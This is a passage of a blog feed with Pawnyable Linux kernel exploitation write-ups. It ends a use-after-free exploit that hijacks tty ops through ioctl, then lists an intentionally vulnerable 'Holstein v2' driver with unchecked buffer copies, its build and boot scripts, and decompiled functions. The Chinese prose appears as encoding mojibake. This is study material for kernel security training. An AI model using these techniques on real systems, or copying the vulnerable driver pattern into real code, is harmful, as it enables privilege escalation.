class="token punctuation">[</span><span class="token number">0x18</span><span class="token punctuation">]</span><span class="token operator">=</span>heap<span class="token operator">+</span><span class="token number">0x30</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">-</span><span class="token number">0xc</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">;</span><span class="token comment">//ops_ioctl</span><span class="token function">write</span><span class="token punctuation">(</span>fd4<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>tty_fd2<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> heap<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/bcc4d57365d2610b8d822b2fc8cb29fe_MD5.jpeg"></p><blockquote><p>é™„ä»¶ï¼š<a href="https://pawnyable.cafe/linux-kernel/LK01/distfiles/LK01-3.tar.gz">LK01-3.tar.gz</a><br>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.wohin.me/posts/pawnyable-0203/">Linux Kernel PWN | 040203 Pawnyableä¹‹UAF (wohin.me)</a><br><a href="https://pawnyable-cafe.translate.goog/linux-kernel/LK01/use_after_free.html?_x_tr_sl=auto&_x_tr_tl=zh-CN&_x_tr_hl=zh-CN&_x_tr_pto=wapp">Holstein v3ï¼šé‡Šæ”¾åä½¿ç”¨åˆ©ç”¨ | å¯å…¸å½“ï¼ (pawnyable-cafe.translate.goog)</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux Kernel pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LK01-2 Holstein v2 å †æº¢å‡º</title>
      <link href="/2024/02/03/LK01-2%20Holstein%20v2%20%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
      <url>/2024/02/03/LK01-2%20Holstein%20v2%20%E5%A0%86%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<p>LKMæºç ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/module.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/kernel.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/cdev.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/fs.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/uaccess.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/slab.h></span></span><span class="token function">MODULE_LICENSE</span><span class="token punctuation">(</span><span class="token string">"GPL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MODULE_AUTHOR</span><span class="token punctuation">(</span><span class="token string">"ptr-yudai"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MODULE_DESCRIPTION</span><span class="token punctuation">(</span><span class="token string">"Holstein v2 - Vulnerable Kernel Driver for Pawnyable"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DEVICE_NAME</span> <span class="token string">"holstein"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUFFER_SIZE</span> <span class="token expression"><span class="token number">0x400</span></span></span><span class="token keyword">char</span> <span class="token operator">*</span>g_buf <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"module_open called\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  g_buf <span class="token operator">=</span> <span class="token function">kmalloc</span><span class="token punctuation">(</span>BUFFER_SIZE<span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>g_buf<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"kmalloc failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token class-name">ssize_t</span> <span class="token function">module_read</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">,</span>                           <span class="token keyword">char</span> __user <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> count<span class="token punctuation">,</span>                           <span class="token class-name">loff_t</span> <span class="token operator">*</span>f_pos<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"module_read called\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_to_user</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> g_buf<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"copy_to_user failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> count<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token class-name">ssize_t</span> <span class="token function">module_write</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">,</span>                            <span class="token keyword">const</span> <span class="token keyword">char</span> __user <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> count<span class="token punctuation">,</span>                            <span class="token class-name">loff_t</span> <span class="token operator">*</span>f_pos<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"module_write called\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"copy_from_user failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> count<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_close</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"module_close called\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">file_operations</span> module_fops <span class="token operator">=</span>  <span class="token punctuation">&#123;</span>   <span class="token punctuation">.</span>owner   <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">,</span>   <span class="token punctuation">.</span>read    <span class="token operator">=</span> module_read<span class="token punctuation">,</span>   <span class="token punctuation">.</span>write   <span class="token operator">=</span> module_write<span class="token punctuation">,</span>   <span class="token punctuation">.</span>open    <span class="token operator">=</span> module_open<span class="token punctuation">,</span>   <span class="token punctuation">.</span>release <span class="token operator">=</span> module_close<span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token class-name">dev_t</span> dev_id<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">cdev</span> c_dev<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">int</span> __init <span class="token function">module_initialize</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">alloc_chrdev_region</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dev_id<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> DEVICE_NAME<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_WARNING <span class="token string">"Failed to register device\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">cdev_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> <span class="token operator">&amp;</span>module_fops<span class="token punctuation">)</span><span class="token punctuation">;</span>  c_dev<span class="token punctuation">.</span>owner <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">cdev_add</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_WARNING <span class="token string">"Failed to add cdev\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> __exit <span class="token function">module_cleanup</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">cdev_del</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">module_init</span><span class="token punctuation">(</span>module_initialize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">module_exit</span><span class="token punctuation">(</span>module_cleanup<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Makefileï¼š</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">obj-m <span class="token operator">:=</span> vuln.oKBUILD_DIR <span class="token operator">:=</span> /lib/modules/<span class="token variable">$</span><span class="token punctuation">(</span>KVERSION<span class="token punctuation">)</span>/buildCFLAGS_vuln.o <span class="token operator">:=</span> -O0<span class="token target symbol">all</span><span class="token punctuation">:</span><span class="token variable">$</span><span class="token punctuation">(</span>MAKE<span class="token punctuation">)</span> -C <span class="token variable">$</span><span class="token punctuation">(</span>KBUILD_DIR<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span><span class="token function">shell</span> pwd<span class="token punctuation">)</span> modules<span class="token target symbol">clean</span><span class="token punctuation">:</span><span class="token variable">$</span><span class="token punctuation">(</span>MAKE<span class="token punctuation">)</span> -C <span class="token variable">$</span><span class="token punctuation">(</span>KBUILD_DIR<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span><span class="token function">shell</span> pwd<span class="token punctuation">)</span> clean<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½¿ç”¨çš„5.15.0çš„å†…æ ¸</p><h1 id="ä¸€ã€LK01-2-Holstein-v2"><a href="#ä¸€ã€LK01-2-Holstein-v2" class="headerlink" title="ä¸€ã€LK01-2 Holstein v2"></a>ä¸€ã€LK01-2 Holstein v2</h1><h2 id="ä¸€-ç¨‹åºåˆ†æ"><a href="#ä¸€-ç¨‹åºåˆ†æ" class="headerlink" title="(ä¸€)ç¨‹åºåˆ†æ"></a>(ä¸€)ç¨‹åºåˆ†æ</h2><h3 id="S99pawnyable"><a href="#S99pawnyable" class="headerlink" title="S99pawnyable"></a>S99pawnyable</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>mdev <span class="token parameter variable">-s</span><span class="token function">mount</span> <span class="token parameter variable">-t</span> proc none /proc<span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /dev/pts<span class="token function">mount</span> <span class="token parameter variable">-vt</span> devpts <span class="token parameter variable">-o</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">4</span>,mode<span class="token operator">=</span><span class="token number">620</span> none /dev/pts<span class="token function">chmod</span> <span class="token number">666</span> /dev/ptmxstty <span class="token parameter variable">-opost</span><span class="token builtin class-name">echo</span> <span class="token number">2</span> <span class="token operator">></span> /proc/sys/kernel/kptr_restrict<span class="token builtin class-name">echo</span> <span class="token number">1</span> <span class="token operator">></span> /proc/sys/kernel/dmesg_restrictinsmod /root/vuln.ko<span class="token function">mknod</span> <span class="token parameter variable">-m</span> <span class="token number">666</span> /dev/holstein c <span class="token variable"><span class="token variable">`</span><span class="token function">grep</span> holstein /proc/devices <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $1;&#125;'</span><span class="token variable">`</span></span> <span class="token number">0</span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>Boot took <span class="token variable"><span class="token variable">$(</span><span class="token function">cut</span> -d<span class="token string">' '</span> <span class="token parameter variable">-f1</span> /proc/uptime<span class="token variable">)</span></span> seconds<span class="token entity" title="\n">\n</span>"</span><span class="token builtin class-name">echo</span> <span class="token string">"[ Holstein v2 (KL01-2) - Pawnyable ]"</span>setsid cttyhack setuidgid <span class="token number">1337</span> <span class="token function">sh</span><span class="token function">umount</span> /procpoweroff <span class="token parameter variable">-d</span> <span class="token number">0</span> <span class="token parameter variable">-f</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>kptr_restrictä¸º2ï¼Œdmesg_restrictä¸º1ï¼Œå†…æ ¸æ—¥å¿—érootä¸å¯è§</p><h3 id="run-sh"><a href="#run-sh" class="headerlink" title="run.sh"></a>run.sh</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>qemu-system-x86_64 <span class="token punctuation">\</span>    <span class="token parameter variable">-m</span> 64M <span class="token punctuation">\</span>    <span class="token parameter variable">-nographic</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-kernel</span> bzImage <span class="token punctuation">\</span>    <span class="token parameter variable">-append</span> <span class="token string">"console=ttyS0 loglevel=3 oops=panic panic=-1 kaslr"</span> <span class="token punctuation">\</span>    -no-reboot <span class="token punctuation">\</span>    <span class="token parameter variable">-cpu</span> qemu64 <span class="token punctuation">\</span>    <span class="token parameter variable">-smp</span> <span class="token number">1</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-monitor</span> /dev/null <span class="token punctuation">\</span>    <span class="token parameter variable">-initrd</span> rootfs.cpio <span class="token punctuation">\</span>    <span class="token parameter variable">-net</span> nic,model<span class="token operator">=</span>virtio <span class="token punctuation">\</span>    <span class="token parameter variable">-net</span> user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰“å¼€äº†kaslr</p><h3 id="vuln-ko"><a href="#vuln-ko" class="headerlink" title="vuln.ko"></a>vuln.ko</h3><p>ä»€ä¹ˆä¿æŠ¤éƒ½æ²¡æœ‰</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATHSymbolsFORTIFYFortifiedFortifiableFILENo RELRO        No canary found   NX disabled   REL             No RPATH   No RUNPATH   <span class="token number">51</span><span class="token punctuation">)</span> Symbols  No<span class="token number">0</span><span class="token number">0</span>./vuln.ko<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="module-initialize"><a href="#module-initialize" class="headerlink" title="module_initialize"></a>module_initialize</h4><p>åœ¨&#x2F;devä¸‹æ³¨å†Œäº†ä¸€ä¸ªåä¸º holstein çš„è®¾å¤‡</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">module_initialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">alloc_chrdev_region</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dev_id<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token string">"holstein"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_50E<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">4294967280LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token function">cdev_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> <span class="token operator">&amp;</span>module_fops<span class="token punctuation">)</span><span class="token punctuation">;</span>    qword_A60 <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>_this_module<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">cdev_add</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>dev_id<span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_52B<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>dev_id<span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token number">4294967280LL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="module-open"><a href="#module-open" class="headerlink" title="module_open"></a>module_open</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">module_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_46A<span class="token punctuation">)</span><span class="token punctuation">;</span>  g_buf <span class="token operator">=</span> <span class="token function">_kmalloc</span><span class="token punctuation">(</span><span class="token number">0x400LL</span><span class="token punctuation">,</span> <span class="token number">06300LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> g_buf <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_480<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">4294967284LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ†é…äº†ä¸€ä¸ª0x400çš„å†…å­˜å—</p><h4 id="module-read"><a href="#module-read" class="headerlink" title="module_read"></a>module_read</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">module_read</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 buf<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int64 a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 kbuf<span class="token punctuation">;</span> <span class="token comment">// [rsp+48h] [rbp-10h]</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_491<span class="token punctuation">)</span><span class="token punctuation">;</span>  kbuf <span class="token operator">=</span> g_buf<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a3 <span class="token operator">>=</span> <span class="token number">0x80000000</span> <span class="token punctuation">)</span>                       <span class="token comment">// æ£€æŸ¥size</span>    <span class="token function">BUG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">check_object_size</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">,</span> a3<span class="token punctuation">,</span> <span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">copy_to_user</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> kbuf<span class="token punctuation">,</span> a3<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> a3<span class="token punctuation">;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_4A7<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">22LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>copy_to_user(buf, kbuf, size)ï¼Œkbuf&#x3D;g_buf</p><h4 id="module-write"><a href="#module-write" class="headerlink" title="module_write"></a>module_write</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">module_write</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 buf<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int64 a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 kbuf<span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-8h]</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_4BE<span class="token punctuation">)</span><span class="token punctuation">;</span>  kbuf <span class="token operator">=</span> g_buf<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a3 <span class="token operator">>=</span> <span class="token number">0x80000000</span> <span class="token punctuation">)</span>    <span class="token function">BUG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">check_object_size</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">,</span> a3<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span>kbuf<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> a3<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> a3<span class="token punctuation">;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_4D5<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">22LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>copy_from_user(kbuf, buf, size)ï¼Œkbuf&#x3D;g_buf</p><h4 id="module-close"><a href="#module-close" class="headerlink" title="module_close"></a>module_close</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">module_close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_4EE<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="äºŒ-åˆ©ç”¨æ€è·¯"><a href="#äºŒ-åˆ©ç”¨æ€è·¯" class="headerlink" title="(äºŒ)åˆ©ç”¨æ€è·¯"></a>(äºŒ)åˆ©ç”¨æ€è·¯</h2><h3 id="å†…æ ¸å †å†…å­˜åˆ†é…ç­–ç•¥"><a href="#å†…æ ¸å †å†…å­˜åˆ†é…ç­–ç•¥" class="headerlink" 